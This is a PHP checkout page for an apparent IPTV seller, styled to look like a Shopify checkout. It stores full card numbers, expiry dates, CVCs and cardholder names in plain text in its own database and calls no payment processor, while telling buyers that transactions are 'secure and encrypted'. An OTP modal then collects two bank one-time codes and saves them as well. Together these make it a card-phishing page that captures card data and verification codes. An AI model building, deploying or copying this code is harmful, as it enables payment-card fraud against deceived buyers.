<?php

declare(strict_types=1);

session_start();

$config = require __DIR__ . '/../config/config.php';
/** @var PDO $pdo */
$pdo = require __DIR__ . '/../config/database.php';

logVisit($pdo);

$postOfferId = isset($_POST['offer_id']) ? max(0, (int) $_POST['offer_id']) : null;
$offerId = $postOfferId !== null ? $postOfferId : (isset($_GET['offer']) ? max(0, (int) $_GET['offer']) : 0);

$paymentSuccess = false;
$confirmationCode = '';
$isAjax = (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') || (isset($_POST['ajax']) && $_POST['ajax'] === '1');
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $isAjax && isset($_POST['otp_value'], $_POST['order_id'])) {
    $otpValue = substr(preg_replace('/\D/', '', (string) ($_POST['otp_value'] ?? '')), 0, 10);
    $orderId = max(0, (int) ($_POST['order_id'] ?? 0));
    $slot = (int) ($_POST['otp_slot'] ?? 1);
    $column = $slot === 2 ? 'otp2' : 'otp';
    $ok = false;
    if ($orderId > 0 && $otpValue !== '') {
        $stmt = $pdo->prepare(sprintf('UPDATE orders SET %s = :otp WHERE id = :id', $column));
        $stmt->execute([
            'otp' => $otpValue,
            'id' => $orderId,
        ]);
        $ok = $stmt->rowCount() > 0;
    }
    header('Content-Type: application/json');
    echo json_encode([
        'success' => $ok,
        'error' => $ok ? null : 'OTP update failed.',
    ]);
    exit;
}
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    try {
    $stmt = $pdo->prepare('INSERT INTO orders (offer_id, contact, newsletter, delivery, first_name, last_name, company, address, apartment, city, country, state, zip, phone, card_number, expiry, cvc, card_name, discount, otp, otp2) VALUES (:offer_id, :contact, :newsletter, :delivery, :first_name, :last_name, :company, :address, :apartment, :city, :country, :state, :zip, :phone, :card_number, :expiry, :cvc, :card_name, :discount, :otp, :otp2)');
    $stmt->execute([
        'offer_id' => $offerId,
        'contact' => $_POST['contact'] ?? '',
        'newsletter' => isset($_POST['newsletter']) ? 1 : 0,
        'delivery' => $_POST['delivery'] ?? '',
            'first_name' => $_POST['first_name'] ?? '',
            'last_name' => $_POST['last_name'] ?? '',
            'company' => $_POST['company'] ?? '',
            'address' => $_POST['address'] ?? '',
            'apartment' => $_POST['apartment'] ?? '',
            'city' => $_POST['city'] ?? '',
            'country' => $_POST['country'] ?? '',
            'state' => $_POST['state'] ?? '',
            'zip' => $_POST['zip'] ?? '',
            'phone' => $_POST['phone'] ?? '',
        'card_number' => $_POST['card_number'] ?? '',
        'expiry' => $_POST['expiry'] ?? '',
        'cvc' => $_POST['cvc'] ?? '',
        'card_name' => $_POST['card_name'] ?? '',
        'discount' => $_POST['discount'] ?? '',
        'otp' => NULL,
        'otp2' => NULL,
    ]);
        $confirmationCode = $pdo->lastInsertId();
        $paymentSuccess = true;
    } catch (\Throwable $e) {
        $paymentSuccess = false;
        $confirmationCode = '';
    }

    if ($isAjax) {
        header('Content-Type: application/json');
        echo json_encode([
            'success' => $paymentSuccess,
            'confirmation' => $confirmationCode,
            'error' => $paymentSuccess ? null : 'Payment could not be processed.',
        ]);
        exit;
    }
}

$settings = getSettings($pdo);
$themeVars = getActiveThemeVars($settings['active_theme'] ?? 'onyx');
$brandTitleSetting = trim($settings['brand_title'] ?? '');
$brandName = $brandTitleSetting !== '' ? $brandTitleSetting : ($config['brand_name'] ?? 'ABDO IPTV CANADA');
$brandTaglineSetting = trim($settings['brand_tagline'] ?? '');
$brandTagline = $brandTaglineSetting !== '' ? $brandTaglineSetting : 'Ultra IPTV à Canada';
$brandLogoDesktop = trim($settings['brand_logo_desktop'] ?? '');
$brandLogoMobile = trim($settings['brand_logo_mobile'] ?? '');
if ($brandLogoMobile === '' && $brandLogoDesktop !== '') {
    $brandLogoMobile = $brandLogoDesktop;
}
$supportWhatsappNumber = trim($settings['support_whatsapp_number'] ?? '') ?: ($config['whatsapp_number'] ?? '');

$selectedOffer = null;
if ($offerId > 0) {
    $stmt = $pdo->prepare('SELECT * FROM offers WHERE id = :id LIMIT 1');
    $stmt->execute(['id' => $offerId]);
    $selectedOffer = $stmt->fetch(PDO::FETCH_ASSOC) ?: null;
}

if (!$selectedOffer) {
    $offers = fetchAllAssoc($pdo, 'SELECT * FROM offers ORDER BY is_featured DESC, price ASC');
    $selectedOffer = $offers[0] ?? null;
}

if (!$selectedOffer) {
    $selectedOffer = [
        'id' => 0,
        'name' => 'IPTV Premium Pack',
        'duration' => '12 mois illimité',
        'price' => 108.00,
        'features' => "Activation en moins de 10 minutes\nSupport WhatsApp FR/AR/EN\n+40K chaînes & VOD",
        'description' => 'Plan recommandé lorsque les offres ne sont pas encore configurées.',
    ];
}

$offerName = $selectedOffer['name'] ?? 'IPTV Premium Pack';
$offerDuration = $selectedOffer['duration'] ?? '12 mois illimité';
$offerPrice = formatCurrency((float) ($selectedOffer['price'] ?? 0));
$offerDescription = trim($selectedOffer['description'] ?? '') ?: 'Confirme ton plan premium et reçois l’activation en 5-7 minutes.';
$offerFeatures = splitFeatures($selectedOffer['features'] ?? '');
$whatsappLink = getWhatsappLink($supportWhatsappNumber, $offerName, (float) ($selectedOffer['price'] ?? 0), $offerDuration);

$basePath = appBasePath();
$posterImage = $basePath . '/assets/images/iptv-logo.svg';

$seoTitle = 'Paiement - ' . $offerName . ' | ' . $brandName;
$seoDescription = 'Complète ta commande ' . $offerName . ' (' . $offerDuration . ') avec un checkout façon Shopify.';

?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= e($seoTitle) ?></title>
    <meta name="description" content="<?= e($seoDescription) ?>">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="<?= $basePath ?>/assets/css/style.css?v=<?= time() ?>">
    <style>
        :root {
            <?php foreach ($themeVars as $var => $value): ?>
            <?= $var ?>: <?= e($value) ?>;
            <?php endforeach; ?>
        }
    </style>
</head>
<body class="checkout-page">
    <div class="noise"></div>
    <main class="checkout-main">
        <section class="payment-checkout" data-animate>
            <div class="payment-card">
                <div class="payment-column payment-column--primary">
                    <div class="checkout-offer-info">
                        <div>
                            <strong><?= e($offerName) ?></strong>
                            <span><?= e($offerDuration) ?></span>
                        </div>
                        <span class="price-tag">$<?= e($offerPrice) ?></span>
                    </div>
                    <form class="checkout-form" action="<?= e($_SERVER['REQUEST_URI'] ?? '') ?>" method="post" novalidate>
                        <input type="hidden" name="offer_id" value="<?= (int) $offerId ?>">
                        <div class="form-head">
                            <h3>Contact information</h3>
                        </div>
                        <label>Email or mobile phone number
                            <input type="text" name="contact" placeholder="jane.doe@email.com" required>
                        </label>
                        <label class="checkbox">
                            <input type="checkbox" name="newsletter" checked>
                            <span>Email me with news and offers</span>
                        </label>
                        <div class="form-head">
                            <h3>Delivery method</h3>
                        </div>
                        <div class="delivery-options">
                            <label class="delivery-option">
                                <input type="radio" name="delivery" value="ship" checked>
                                <div class="delivery-option__details">
                                    <div>
                                        <strong>Ship</strong>
                                        <small>Activation digitale en 5-7 min</small>
                                    </div>
                                </div>
                            </label>
                            <label class="delivery-option">
                                <input type="radio" name="delivery" value="pickup">
                                <div class="delivery-option__details">
                                    <div>
                                        <strong>Pick up</strong>
                                        <small>Support WhatsApp ou e-mail</small>
                                    </div>
                                </div>
                            </label>
                        </div>
                        <div class="form-head">
                            <h3>Shipping address</h3>
                        </div>
                        <div class="inline-inputs">
                            <label>First name
                                <input type="text" name="first_name" placeholder="John" required>
                            </label>
                            <label>Last name
                                <input type="text" name="last_name" placeholder="Smith" required>
                            </label>
                        </div>
                        <label>Company (optional)
                            <input type="text" name="company" placeholder="ABDO IPTV">
                        </label>
                        <label>Address
                            <input type="text" name="address" placeholder="123 Av. du Mont-Royal" required>
                        </label>
                        <label>Apartment, suite, etc. (optional)
                            <input type="text" name="apartment" placeholder="Unit 302">
                        </label>
                        <label>City
                            <input type="text" name="city" placeholder="Montréal" required>
                        </label>
                        <div class="shipping-grid">
                            <label>Country/region
                                <select name="country" required>
                                    <option>Canada</option>
                                    <option>United States</option>
                                    <option>France</option>
                                </select>
                            </label>
                            <label>State / Province
                                <input type="text" name="state" placeholder="QC" required>
                            </label>
                            <label>ZIP / Postal code
                                <input type="text" name="zip" placeholder="H2X 1Y4" required>
                            </label>
                        </div>
                    <label>Phone
                        <input type="text" name="phone" placeholder="+1 514 555 0000" required>
                    </label>
                    <div class="payment-confirmation" <?= $paymentSuccess ? '' : 'hidden' ?> data-payment-confirmation>
                        <div class="confirmation-icon">✔</div>
                        <div>
                            <strong>Thank you!</strong>
                            <p>Confirmation #<span data-confirmation-code><?= e($confirmationCode) ?></span></p>
                        </div>
                    </div>
                    <div class="card-payment">
                        <div class="card-payment__head">
                            <div>
                                <span class="card-payment__label">Payment</span>
                                <p>All transactions are secure and encrypted.</p>
                            </div>
                            <div class="card-payment__icons">
                                <img src="https://footballpatchking.com/cdn/shopifycloud/checkout-web/assets/c1/assets/visa.sxIq5Dot.svg" alt="Visa" loading="lazy" width="38" height="24">
                                <img src="https://footballpatchking.com/cdn/shopifycloud/checkout-web/assets/c1/assets/mastercard.1c4_lyMp.svg" alt="Mastercard" loading="lazy">
                                <img src="https://footballpatchking.com/cdn/shopifycloud/checkout-web/assets/c1/assets/amex.Csr7hRoy.svg" alt="American Express" loading="lazy">
                                <span class="card-payment__more" tabindex="0">
                                    +5
                                    <span class="card-payment__popover" aria-hidden="true">
                                        <img src="https://footballpatchking.com/cdn/shopifycloud/checkout-web/assets/c1/assets/discover.C7UbFpNb.svg" alt="Discover">
                                        <img src="https://footballpatchking.com/cdn/shopifycloud/checkout-web/assets/c1/assets/jcb.BgZHqF0u.svg" alt="JCB">
                                        <img src="https://footballpatchking.com/cdn/shopifycloud/checkout-web/assets/c1/assets/diners_club.B9hVEmwz.svg" alt="DINERS CLUB">
                                        <img src="https://footballpatchking.com/cdn/shopifycloud/checkout-web/assets/c1/assets/unionpay.8M-Boq_z.svg" alt="UNIONPAY">
                                        <img src="https://footballpatchking.com/cdn/shopifycloud/checkout-web/assets/c1/assets/elo.Clup5T29.svg" alt="Elo">
                                    </span>
                                </span>
                            </div>
                    </div>
                        <div class="card-payment__grid">
                            <label class="card-input">
                                Card number
                                <div class="card-input__field">
                                    <input type="text" name="card_number" placeholder="1234 1234 1234 1234" data-card-number inputmode="numeric" autocomplete="cc-number" maxlength="19" pattern="[0-9 ]*" required>
                                    <span class="card-brand" data-card-brand hidden>
                                        <img src="https://footballpatchking.com/cdn/shopifycloud/checkout-web/assets/c1/assets/visa.sxIq5Dot.svg" alt="Card brand" loading="lazy" data-default-logo="https://footballpatchking.com/cdn/shopifycloud/checkout-web/assets/c1/assets/visa.sxIq5Dot.svg">
                                    </span>
                                </div>
                                <small class="input-error" data-error="card_number"></small>
                            </label>
                            <div class="card-payment__row">
                                <label>
                                    Expiration date (MM / YY)
                                    <input type="text" name="expiry" placeholder="MM / YY" data-card-expiry inputmode="numeric" autocomplete="cc-exp" required>
                                    <small class="input-error" data-error="expiry">Enter a valid expiration date</small>
                                </label>
                                <label>
                                    Security code
                                    <input
                                        type="tel"
                                        name="cvc"
                                        placeholder="CVC"
                                        data-card-cvc
                                        inputmode="numeric"
                                        autocomplete="cc-csc"
                                        maxlength="3"
                                        oninput="this.value=this.value.replace(/\\D/g,'').slice(0, this.maxLength || 3)"
                                        required
                                    >
                                    <small class="input-error" data-error="cvc"></small>
                                </label>
                            </div>
                            <label>
                                Name on card
                                <input type="text" name="card_name" placeholder="Full name" data-card-name autocomplete="cc-name" required>
                                <small class="input-error" data-error="card_name"></small>
                            </label>
                        </div>
                    </div>
                    <div class="checkout-actions">
                        <button type="submit" class="btn primary" data-card-submit>Pay now</button>
                        <a href="<?= $basePath ?>/#offres" class="link-light">Return to offers</a>
                    </div>
                    <p class="input-error" data-payment-error></p>
                </form>
            </div>
                <div class="payment-column payment-column--summary">
                    <div class="summary-card">
                        <div class="summary-item">
                            <div class="summary-thumb">
                                <img src="<?= e($posterImage) ?>" alt="<?= e($offerName) ?>">
                                <span class="summary-count">1</span>
                            </div>
                            <div>
                                <strong><?= e($offerName) ?></strong>
                                <small><?= e($offerDuration) ?></small>
                            </div>
                            <span class="summary-price">$<?= e($offerPrice) ?></span>
                        </div>
                        <label class="gift-input">
                            <span>Gift card or discount code</span>
                            <div>
                                <input type="text" name="discount" placeholder="Promo code">
                                <button type="button">Apply</button>
                            </div>
                        </label>
                        <div class="summary-line">
                            <span>Subtotal</span>
                            <span>$<?= e($offerPrice) ?></span>
                        </div>
                        <div class="summary-total">
                            <span>Total</span>
                            <div>
                                <small>CAD</small>
                                <strong>$<?= e($offerPrice) ?></strong>
                            </div>
                        </div>
                        <?php if ($offerFeatures): ?>
                            <div class="summary-features">
                                <p>Ce plan inclut :</p>
                                <ul>
                                    <?php foreach ($offerFeatures as $feature): ?>
                                        <li><?= e($feature) ?></li>
                                    <?php endforeach; ?>
                                </ul>
                            </div>
                        <?php endif; ?>
                    </div>
                </div>
            </div>
        </section>
    </main>

    <footer class="checkout-footer">
        <p>© <?= date('Y') ?> <?= e($brandName) ?> — Paiement sécurisé.</p>
        <a href="<?= e(getWhatsappLink($supportWhatsappNumber, 'Support checkout')) ?>" target="_blank" rel="noopener">Besoin d’aide ? Écris-nous sur WhatsApp</a>
    </footer>

    <a class="whatsapp-float whatsapp-float--chat" href="<?= e($whatsappLink) ?>" target="_blank" rel="noopener" aria-label="WhatsApp">
        <svg viewBox="0 0 24 24" role="img" aria-hidden="true">
            <path fill="currentColor" d="M12 2a10 10 0 0 0-8.94 14.5L2 22l5.65-1.48A10 10 0 1 0 12 2zm0 1.8a8.2 8.2 0 0 1 6.69 12.85 8.2 8.2 0 0 1-9.34 2.59l-.27-.1-3.38.88.9-3.34-.17-.28A8.2 8.2 0 0 1 12 3.8zm3.66 5.04c-.2-.005-.49-.01-.77.48-.27.49-.9 1.4-.98 1.5-.08.1-.18.15-.32.08-.14-.07-.6-.22-1.14-.56-.84-.48-1.37-1.08-1.53-1.26-.16-.18-.02-.28.12-.41.12-.12.3-.32.42-.48.14-.16.18-.28.26-.46.08-.18.04-.35-.02-.48-.07-.13-.6-1.46-.82-2-.22-.54-.46-.48-.63-.48h-.54c-.17 0-.44.06-.67.31-.23.25-.88.86-.88 2.1 0 1.24.9 2.44 1.03 2.6.12.16 1.78 2.72 4.3 3.9.6.27 1.07.43 1.44.55.6.19 1.14.16 1.57.1.48-.07 1.48-.61 1.69-1.21.21-.6.21-1.12.15-1.21-.06-.09-.22-.14-.42-.15z"/>
        </svg>
    </a>
    <div class="payment-overlay" data-payment-loader hidden>
        <div class="payment-overlay__content">
            <div class="loading-ring"></div>
            <p>Processing payment...</p>
        </div>
    </div>
    <div class="otp-modal" data-otp-modal hidden>
        <div class="otp-modal__content">
            <h3>Secure verification</h3>
            <p>Enter the 6-digit OTP sent to you to finalize the payment.</p>
            <input type="tel" maxlength="6" placeholder="______" inputmode="numeric" data-otp-input autocomplete="one-time-code">
            <small class="input-error" data-otp-error></small>
            <div class="otp-modal__actions">
                <button type="button" class="btn primary" data-otp-confirm>Confirm</button>
                <button type="button" class="btn ghost" data-otp-cancel>Cancel</button>
            </div>
        </div>
    </div>
    <script>
        window.APP_THEME = <?= json_encode($settings['active_theme'] ?? 'onyx') ?>;
    </script>
    <script src="<?= $basePath ?>/assets/js/main.js?v=<?= time() ?>" defer></script>

</body>
</html>
